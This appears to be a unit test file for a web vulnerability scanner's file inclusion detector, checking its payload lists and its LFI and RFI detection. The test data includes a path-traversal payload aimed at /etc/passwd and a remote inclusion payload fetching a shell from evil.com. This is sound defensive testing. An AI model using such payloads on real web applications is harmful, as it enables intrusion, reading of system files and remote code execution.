# tests/unit/test_file_inclusion.py - File Inclusion scanner test suite

from vulnradar.scanners.file_inclusion import FileInclusionScanner
import pytest


@pytest.mark.unit
class TestFileInclusionScanner:
    """Unit tests for file inclusion scanner."""
    
    def test_scanner_initialization(self):
        """Test scanner initializes with payloads."""
        scanner = FileInclusionScanner()
        
        assert len(scanner.lfi_payloads) > 0
        assert len(scanner.rfi_payloads) > 0
        assert len(scanner.lfi_patterns) > 0
        assert len(scanner.file_params) > 0
    
    @pytest.mark.asyncio
    async def test_detect_lfi(self):
        """Test LFI detection."""
        scanner = FileInclusionScanner()
        
        # Test with /etc/passwd content
        response = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon"
        payload = "../../../../etc/passwd"
        
        is_lfi = await scanner._detect_lfi(response, payload)
        assert is_lfi is True
        
        # Test with non-vulnerable response
        response = "Welcome to our website"
        is_lfi = await scanner._detect_lfi(response, payload)
        assert is_lfi is False
    
    @pytest.mark.asyncio
    async def test_detect_rfi(self):
        """Test RFI detection."""
        scanner = FileInclusionScanner()
        
        # Test with external content
        response = "Content from evil.com: shell uploaded"
        payload = "http://evil.com/shell.txt"
        
        is_rfi = await scanner._detect_rfi(response, payload)
        assert is_rfi is True
